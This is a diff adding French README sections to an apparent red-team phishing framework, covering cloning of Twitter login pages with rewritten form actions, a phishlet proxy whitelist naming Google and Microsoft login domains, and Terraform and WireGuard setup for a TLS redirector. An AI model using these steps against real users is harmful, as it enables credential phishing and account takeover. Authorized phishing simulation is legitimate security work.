@@ -238,6 +238,25 @@ Fonctionnalités du menu :
 
 ---
 
+## 🎯 Fidélité des Pages (Mirroring)
+
+- Génération de templates fidèles aux originaux via mirroring:
+  - `python templates/cli.py generate --platform twitter --type login --source-url https://twitter.com/i/flow/login --output out/twitter_login`
+  - Le moteur mirror récupère le DOM et les CSS et les intègre au template.
+  - Fallback automatique sur gabarits si l’URL n’est pas accessible.
+  - Option: `--form-action https://lab.local/submit` pour remplacer action des formulaires.
+
+---
+
+## 🛡️ Whitelist de Domaines (Proxy Phishlet)
+
+- Le proxy n’autorise que les domaines cibles autorisés:
+  - Env: `WHITELIST_DOMAINS=twitter.com,google.com,login.microsoftonline.com`
+  - Ou via phishlet: `allowed_domains:` dans le YAML
+- Requête vers un domaine non listé → 403 Forbidden
+
+---
+
 ## 🧪 God Mode Headless
 
 - Lancer God Mode sans portail (génère uniquement les artefacts):
@@ -245,6 +264,38 @@ Fonctionnalités du menu :
   - ou `GODMODE_HEADLESS=1 python3 godmode.py`
 - Artefacts générés:
   - `mutated_phishlets/`, `analysis.json`, `signatures.json`
+
+---
+
+## 🌐 Redirector WAN (Terraform)
+
+- Variables d’environnement recommandées:
+  - `TF_VAR_aws_region=us-east-1`
+  - `TF_VAR_domain=your.engagement.domain`
+  - `TF_VAR_letsencrypt_email=security@your.org`
+- Commandes:
+  - `make plan-redirector`
+  - `make deploy-redirector`
+  - `make destroy-redirector`
+- Le redirector configure TLS automatiquement via Caddy et proxy 127.0.0.1:8080 (à relier via tunnel chifré).
+
+---
+
+## 🔐 WireGuard (Tunnel chifré)
+
+- Variables Terraform supplémentaires:
+  - `TF_VAR_wg_cidr=10.20.0.0/24`
+  - `TF_VAR_wg_server_address=10.20.0.1/24`
+  - `TF_VAR_wg_peer_address=10.20.0.2`
+  - `TF_VAR_wg_peer_allowed_ips=10.20.0.2/32`
+  - `TF_VAR_wg_peer_public_key=<PEER_PUBLIC_KEY>`
+- Sur le serveur:
+  - Le script génère la clé privée/publique du serveur (`/etc/wireguard/server.key`/`server.pub`) et active `wg0`.
+  - Caddy reverse_proxy pointe vers `10.20.0.2:8080` (backend via tunnel).
+- Côté peer (local backend):
+  - Afficher le template: `make wg-peer-template`
+  - Remplir `PEER_PRIVATE_KEY`, `SERVER_PUBLIC_KEY`, `SERVER_PUBLIC_IP`
+  - Activer: `wg-quick up wg0` (ou via votre gestionnaire réseau)
 
 ---
 
